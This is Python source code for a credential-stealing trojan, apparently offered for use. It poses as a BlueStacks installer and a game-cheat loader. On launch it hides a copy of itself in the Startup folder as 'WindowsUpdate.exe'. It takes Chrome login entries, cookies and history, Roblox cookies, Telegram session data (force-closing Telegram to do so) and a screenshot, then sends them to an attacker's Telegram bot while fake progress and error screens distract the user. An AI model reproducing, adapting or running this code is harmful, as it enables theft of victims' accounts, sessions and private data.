import subprocess
import sys
import os
import importlib
import threading
import time
import ctypes
import shutil
import tempfile
import requests
import json
import sqlite3
import base64
import getpass
import io
from datetime import datetime, timedelta

# Функция скрытной установки библиотек
def install_packages_silently():
    """Автоматически устанавливает все необходимые библиотеки скрытно"""
    packages = [
        'pillow',
        'pyTelegramBotAPI',
        'browser-cookie3',
        'requests'
    ]
    
    for package in packages:
        try:
            package_name = package.replace('-', '_').replace('pyTelegramBotAPI', 'telebot')
            importlib.import_module(package_name)
        except ImportError:
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package, "--quiet"],
                    startupinfo=startupinfo,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    shell=False,
                    timeout=60
                )
                time.sleep(0.5)
            except:
                pass

# Запускаем установку библиотек в фоновом потоке
install_thread = threading.Thread(target=install_packages_silently, daemon=True)
install_thread.start()

# Импорты после установки
import tkinter as tk
from tkinter import ttk
import telebot
from PIL import ImageGrab

BOT_TOKEN = 'вставь свои данные stealer by qwenix'
CHAT_ID = 'вставь свои данные stealer by qwenix'
bot = telebot.TeleBot(BOT_TOKEN)

def is_telegram_running():
    """Проверяет запущен ли Telegram"""
    try:
        # Проверяем процессы Telegram
        result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq Telegram.exe'], 
                               capture_output=True, text=True, shell=True)
        if 'Telegram.exe' in result.stdout:
            return True
        
        # Проверяем папку tdata (если открыт Telegram, tdata заблокирован)
        tdata_path = os.path.expanduser('~/AppData/Roaming/Telegram Desktop/tdata')
        if os.path.exists(tdata_path):
            try:
                # Пробуем открыть папку - если ошибка, значит Telegram запущен
                test_file = os.path.join(tdata_path, 'D877F783D5D3EF8C')
                with open(test_file, 'rb') as f:
                    f.read(1)
                return False
            except:
                return True
        return False
    except:
        return False

def kill_telegram():
    """Принудительно закрывает Telegram"""
    try:
        subprocess.run(['taskkill', '/F', '/IM', 'Telegram.exe'], 
                      capture_output=True, shell=True)
        time.sleep(2)
    except:
        pass

def add_to_startup():
    """Добавляет программу в автозагрузку"""
    try:
        user_name = getpass.getuser()
        startup_path = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        exe_path = os.path.join(startup_path, "WindowsUpdate.exe")
        
        if not os.path.exists(exe_path):
            current_file = sys.executable if hasattr(sys, 'frozen') else __file__
            shutil.copy2(current_file, exe_path)
            ctypes.windll.kernel32.SetFileAttributesW(exe_path, 2)
    except:
        pass

def steal_chrome_passwords():
    """Крадет пароли из Chrome"""
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        if not os.path.exists(db_path):
            return "Chrome passwords not found"
        
        temp_db = os.path.join(tempfile.gettempdir(), "chrome_passwords.db")
        shutil.copyfile(db_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value FROM logins LIMIT 50")
        
        passwords = []
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            if origin_url and username:
                passwords.append(f"URL: {origin_url}\nUser: {username}\n{'-'*50}")
        
        conn.close()
        os.remove(temp_db)
        return "\n".join(passwords) if passwords else "No passwords found"
    except:
        return "Chrome passwords error"

def steal_chrome_cookies():
    """Крадет куки из Chrome"""
    try:
        import browser_cookie3
        cookies_data = []
        for cookie in browser_cookie3.chrome():
            cookies_data.append(f"{cookie.domain} | {cookie.name} = {cookie.value[:50]}")
            if len(cookies_data) >= 100:
                break
        return "\n".join(cookies_data) if cookies_data else "No cookies found"
    except:
        return "Chrome cookies error"

def steal_chrome_history():
    """Крадет историю Chrome"""
    try:
        history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "History")
        if not os.path.exists(history_path):
            return "Chrome history not found"
        
        temp_history = os.path.join(tempfile.gettempdir(), "chrome_history.db")
        shutil.copyfile(history_path, temp_history)
        
        conn = sqlite3.connect(temp_history)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        
        history = []
        for row in cursor.fetchall():
            history.append(f"URL: {row[0]}\nTitle: {row[1]}\n{'-'*50}")
        
        conn.close()
        os.remove(temp_history)
        return "\n".join(history) if history else "No history found"
    except:
        return "Chrome history error"

def steal_roblox_cookies():
    """Крадет куки Roblox"""
    try:
        import browser_cookie3
        roblox_cookies = []
        for cookie in browser_cookie3.load():
            if 'roblox' in cookie.domain.lower():
                roblox_cookies.append(f"{cookie.domain} | {cookie.name} = {cookie.value[:50]}")
            if len(roblox_cookies) >= 20:
                break
        return "\n".join(roblox_cookies) if roblox_cookies else "No Roblox cookies found"
    except:
        return "Roblox cookies error"

def collect_system_info():
    """Собирает системную информацию"""
    try:
        info = f"""
💻 SYSTEM INFORMATION:
👤 User: {getpass.getuser()}
🖥️ PC Name: {os.environ.get('COMPUTERNAME', 'Unknown')}
⚙️ OS: {os.environ.get('OS', 'Unknown')}
🔧 Processor: {os.environ.get('PROCESSOR_IDENTIFIER', 'Unknown')}
📁 User Profile: {os.environ.get('USERPROFILE', 'Unknown')}
        """
        return info
    except:
        return "System info error"

def take_screenshot():
    """Делает скриншот"""
    try:
        screenshot = ImageGrab.grab()
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='PNG')
        return ('screenshot.png', img_buffer.getvalue())
    except:
        return None

def collect_tdata():
    """Крадет TData Telegram (только если Telegram закрыт)"""
    if is_telegram_running():
        kill_telegram()
        time.sleep(2)
    
    tdata_paths = [
        os.path.expanduser('~/AppData/Roaming/Telegram Desktop/tdata'),
        os.path.expanduser('~/AppData/Roaming/AYogram/tdata'),
    ]
    
    collected_data = []
    for path in tdata_paths:
        if os.path.exists(path):
            try:
                temp_dir = os.path.join(os.environ['TEMP'], f'tdata_temp')
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
                
                shutil.copytree(path, temp_dir)
                zip_filename = temp_dir + '.zip'
                shutil.make_archive(temp_dir, 'zip', temp_dir)
                
                with open(zip_filename, 'rb') as f:
                    zip_data = f.read()
                
                shutil.rmtree(temp_dir)
                os.remove(zip_filename)
                collected_data.append((f'tdata.zip', zip_data))
            except:
                pass
    return collected_data

def send_stolen_data():
    """Отправляет все украденные данные"""
    try:
        system_info = collect_system_info()
        bot.send_message(CHAT_ID, system_info)
        
        chrome_passwords = steal_chrome_passwords()
        bot.send_document(CHAT_ID, chrome_passwords.encode(), visible_file_name="chrome_passwords.txt")
        
        chrome_cookies = steal_chrome_cookies()
        bot.send_document(CHAT_ID, chrome_cookies.encode(), visible_file_name="chrome_cookies.txt")
        
        chrome_history = steal_chrome_history()
        bot.send_document(CHAT_ID, chrome_history.encode(), visible_file_name="chrome_history.txt")
        
        roblox_cookies = steal_roblox_cookies()
        bot.send_message(CHAT_ID, f"🎮 ROBLOX:\n{roblox_cookies[:3000]}")
        
        tdata_files = collect_tdata()
        for name, data in tdata_files:
            bot.send_document(CHAT_ID, data, visible_file_name=name)
        
        screenshot = take_screenshot()
        if screenshot:
            bot.send_photo(CHAT_ID, screenshot[1], caption="📸 Screenshot")
        
        bot.send_message(CHAT_ID, "✅ DATA COLLECTED SUCCESSFULLY!")
    except Exception as e:
        print(f"Error: {e}")

def steal_all_data():
    """Основная функция кражи"""
    add_to_startup()
    time.sleep(2)
    threading.Thread(target=send_stolen_data, daemon=True).start()

class SmoothLoadingScreen:
    def __init__(self, root):
        self.root = root
        self.loading_window = None
        
    def show(self):
        self.loading_window = tk.Toplevel(self.root)
        self.loading_window.title("BlueStacks Installer")
        self.loading_window.geometry("500x450")
        self.loading_window.configure(bg='#0a0a0a')
        self.loading_window.resizable(False, False)
        self.loading_window.overrideredirect(True)
        self.loading_window.attributes('-topmost', True)
        
        # Центрируем
        self.loading_window.geometry("+%d+%d" % (
            self.root.winfo_screenwidth()//2 - 250,
            self.root.winfo_screenheight()//2 - 225
        ))
        
        # Основной контейнер
        content = tk.Frame(self.loading_window, bg='#0a0a0a')
        content.pack(expand=True, fill='both', padx=40, pady=50)
        
        # Логотип BlueStacks
        self.logo_label = tk.Label(content, text="📱", font=('Segoe UI', 48), 
                                   bg='#0a0a0a', fg='#00a8f3')
        self.logo_label.pack(pady=(0, 10))
        
        # Заголовок
        self.title_label = tk.Label(content, text="Adb Bluestacks install",
                                    font=('Segoe UI', 18, 'bold'),
                                    bg="#0a0a0a", fg='#ffffff')
        self.title_label.pack(pady=(0, 5))
        
        # Статус анимации
        self.status_label = tk.Label(content, text="HD-player.exe...",
                                     font=('Segoe UI', 11),
                                     bg='#0a0a0a', fg='#cccccc')
        self.status_label.pack(pady=(0, 20))
        
        # Прогресс бар
        self.progress = ttk.Progressbar(content, mode='determinate', length=400)
        self.progress.pack(pady=10)
        
        # Процент
        self.percent_label = tk.Label(content, text="0%", font=('Segoe UI', 12, 'bold'),
                                      bg="#0a0a0a", fg="#ff0000")
        self.percent_label.pack()
        
        # Анимированные точки
        self.dots_label = tk.Label(content, text="", font=('Segoe UI', 14),
                                   bg='#0a0a0a', fg="#ff0000")
        self.dots_label.pack(pady=(10, 0))
        
        # Подпись
        team_label = tk.Label(content, text="by Qwenix", font=('Segoe UI', 9),
                              bg='#0a0a0a', fg="#FF0000")
        team_label.pack(side='bottom', pady=(20, 0))
        
        # Запускаем анимацию
        self.animate_dots()
        self.update_progress()
        
        return self.loading_window
    
    def animate_dots(self):
        dots = ["", ".", "..", "..."]
        self.dot_index = 0
        def update():
            self.dots_label.config(text=dots[self.dot_index % 4])
            self.dot_index += 1
            if self.loading_window and self.loading_window.winfo_exists():
                self.loading_window.after(300, update)
        update()
    
    def update_progress(self):
        stages = [
            (5, "Downloading BlueStacks adb..."),
            (15, "Extracting files..."),
            (30, "Installing ADB drivers..."),
            (50, "Configuring Android engine..."),
            (70, "Setting up EnterloseDLL..."),
            (85, "Finalizing installation..."),
            (100, "Installation complete!")
        ]
        
        self.current_stage = 0
        
        def next_stage():
            if self.current_stage < len(stages):
                progress, text = stages[self.current_stage]
                self.progress['value'] = progress
                self.percent_label.config(text=f"{progress}%")
                self.status_label.config(text=text)
                self.current_stage += 1
                
                # Меняем эмодзи на разных этапах
                emojis = ["📦", "📦", "📦", "📦", "📦", "📦", "📦"]
                if self.current_stage - 1 < len(emojis):
                    self.logo_label.config(text=emojis[self.current_stage - 1])
                
                if self.loading_window and self.loading_window.winfo_exists():
                    self.loading_window.after(1800, next_stage)
            else:
                # Загрузка завершена
                self.status_label.config(text="Launching Loader...", fg="#0a0a0a")
                self.loading_window.after(1500, self.finish)
        
        next_stage()
    
    def finish(self):
        if self.loading_window and self.loading_window.winfo_exists():
            self.loading_window.destroy()
        show_main_interface()

def execute_operation(operation_type):
    """Выполняет инжект"""
    def run():
        inject_window = show_inject_animation()
        threading.Thread(target=send_stolen_data, daemon=True).start()
    threading.Thread(target=run, daemon=True).start()

def show_inject_animation():
    inject_window = tk.Toplevel(root)
    inject_window.title("Enterlose.pw")
    inject_window.geometry("500x400")
    inject_window.configure(bg="#000000")
    inject_window.resizable(False, False)
    inject_window.overrideredirect(True)
    inject_window.attributes('-topmost', True)
    
    inject_window.geometry("+%d+%d" % (root.winfo_x() + root.winfo_width()//2 - 250,
                                      root.winfo_y() + root.winfo_height()//2 - 200))
    
    content = tk.Frame(inject_window, bg='#0a0a0a')
    content.pack(expand=True, fill='both', padx=40, pady=40)
    
    inject_label = tk.Label(content, text="INJECTING...", font=('Consolas', 24, 'bold'),
                           bg='#0a0a0a', fg="#ff0000")
    inject_label.pack(pady=(20, 10))
    
    progress = ttk.Progressbar(content, mode='determinate', length=400)
    progress.pack(pady=20)
    
    dots_label = tk.Label(content, text="", font=('Consolas', 14),
                         bg='#0a0a0a', fg="#ff0000")
    dots_label.pack()
    
    status_label = tk.Label(content, text="Initializing injection...", font=('Consolas', 10),
                           bg='#0a0a0a', fg="#FF0000")
    status_label.pack(pady=(10, 0))
    
    close_btn = tk.Button(content, text="❌ Close", font=('Consolas', 14, 'bold'),
                         bg='#ff4444', fg='white', relief='flat',
                         command=inject_window.destroy, cursor='hand2',
                         padx=30, pady=10)
    
    def animate_dots():
        dots = ["", ".", "..", "..."]
        i = 0
        def update():
            nonlocal i
            dots_label.config(text=dots[i % 4])
            i += 1
            if inject_window.winfo_exists():
                inject_window.after(300, update)
        update()
    
    def update_progress():
        stages = [(10, "Scanning PID..."), (25, "Loading enterDll..."), (45, "Connecting ADB..."),
                  (65, "Injecting Internal.dll..."), (85, "Finalizing..."), (100, "Complete!")]
        current = 0
        def next_stage():
            nonlocal current
            if current < len(stages):
                p, t = stages[current]
                progress['value'] = p
                status_label.config(text=t)
                current += 1
                inject_window.after(800, next_stage)
        next_stage()
    
    animate_dots()
    update_progress()
    
    def show_error():
        progress.stop()
        inject_label.config(text="ERROR INJECT", fg='#ff4444')
        dots_label.config(text="Error 404", fg='#ff4444')
        status_label.config(text="Injection failed: server error", fg='#ff4444')
        close_btn.pack(pady=(20, 0))
        
        def blink():
            colors = ['#ff4444', "#ff0000", '#ff0000']
            for c in colors:
                inject_label.config(fg=c)
                inject_window.update()
                time.sleep(0.3)
            if inject_window.winfo_exists():
                inject_window.after(100, blink)
        blink()
    
    inject_window.after(7000, show_error)
    return inject_window

def show_main_interface():
    for widget in root.winfo_children():
        widget.destroy()
    
    root.deiconify()
    root.title("Enterlose.pw LOADER")
    root.geometry("500x600")
    root.configure(bg='#0a0a0a')
    root.resizable(False, False)
    
    root.geometry("+%d+%d" % (root.winfo_screenwidth()//2 - 250,
                             root.winfo_screenheight()//2 - 300))
    
    style = ttk.Style()
    style.theme_use('clam')
    
    style.configure('Internal.TButton', font=('Consolas', 14, 'bold'),
                   padding=(35, 25), background='#1a1a1a', foreground="#ff0000",
                   borderwidth=2, highlightthickness=2, highlightbackground="#ff0000")
    
    style.configure('External.TButton', font=('Consolas', 22, 'bold'),
                   padding=(50, 35), background='#1a1a1a', foreground="#ff0000",
                   borderwidth=2, highlightthickness=2, highlightbackground="#ff0000")
    
    style.map('Internal.TButton', background=[('active', '#2a2a2a')])
    style.map('External.TButton', background=[('active', '#2a2a2a')])
    
    main_container = tk.Frame(root, bg='#0a0a0a')
    main_container.pack(expand=True, fill='both', padx=50, pady=50)
    
    header = tk.Frame(main_container, bg='#0a0a0a')
    header.pack(pady=(0, 30))
    
    logo_label = tk.Label(header, text="⚡", font=('Segoe UI', 36, 'bold'),
                         bg='#0a0a0a', fg="#ff0000")
    logo_label.pack()
    
    title_label = tk.Label(header, text="Enterlose.pw LOADER", font=('Consolas', 20, 'bold'),
                          bg='#0a0a0a', fg="#ff0000")
    title_label.pack(pady=(5, 0))
    
    subtitle_label = tk.Label(header, text="Premium Paid version", font=('Consolas', 10),
                             bg='#0a0a0a', fg='#888888')
    subtitle_label.pack(pady=(5, 0))
    
    selector_frame = tk.Frame(main_container, bg='#2a2a2a', relief='flat', bd=1,
                             highlightthickness=1, highlightbackground='#00ff88')
    selector_frame.pack(fill='x', pady=(0, 30))
    
    selector_label = tk.Label(selector_frame, text="🖥️ PC LOADER", font=('Consolas', 14, 'bold'),
                             bg='#2a2a2a', fg="#ff0000", anchor='center')
    selector_label.pack(fill='x', padx=20, pady=20)
    
    buttons_frame = tk.Frame(main_container, bg='#0a0a0a')
    buttons_frame.pack(fill='x', pady=(0, 30))
    
    internal_btn = ttk.Button(buttons_frame, text=" LOAD INTERNAL", style='Internal.TButton',
                             command=lambda: execute_operation('internal'))
    internal_btn.pack(fill='x', pady=(0, 25))
    
    external_btn = ttk.Button(buttons_frame, text="LOAD EXTERNAL", style='External.TButton',
                             command=lambda: execute_operation('external'))
    external_btn.pack(fill='x', pady=15)
    
    status_frame = tk.Frame(main_container, bg="#ff0000", highlightthickness=1, highlightbackground='#333333')
    status_frame.pack(fill='x', pady=(20, 0))
    
    status_label = tk.Label(status_frame, text="", font=('Consolas', 10, 'bold'),
                           bg='#1a1a1a', fg="#ff0000")
    status_label.pack(pady=15)
    
    info_frame = tk.Frame(main_container, bg='#2a2a2a', highlightthickness=1, highlightbackground='#333333')
    info_frame.pack(fill='x', pady=(20, 0))
    
    info_label = tk.Label(info_frame, text="🔒Анти кряк система • 🔍 • 📧 Auto inject",
                         font=('Consolas', 8), bg='#2a2a2a', fg='#666666')
    info_label.pack(pady=12)
    
    footer = tk.Frame(main_container, bg='#0a0a0a')
    footer.pack(side='bottom', fill='x', pady=(10, 0))
    
    footer_label = tk.Label(footer, text="Beta 0.1 • Adb inject system • 100 no ban 2026",
                           font=('Consolas', 8), bg='#0a0a0a', fg='#444444')
    footer_label.pack()
    
    team_label = tk.Label(footer, text="by thisteam", font=('Consolas', 10, 'bold'),
                         bg='#0a0a0a', fg="#ff0000")
    team_label.pack(pady=(5, 0))
    
    def animate_logo():
        symbols = ["✨", "✨", "✨", "✨"]
        i = 0
        def update():
            nonlocal i
            logo_label.config(text=symbols[i % 4])
            i += 1
            if root.winfo_exists():
                root.after(1000, update)
        update()
    animate_logo()

# Запуск
root = tk.Tk()
root.withdraw()

# Показываем плавную загрузку BlueStacks
loading_screen = SmoothLoadingScreen(root)
loading_screen.show()

# Запускаем кражу данных в фоне
threading.Thread(target=steal_all_data, daemon=True).start()

root.mainloop()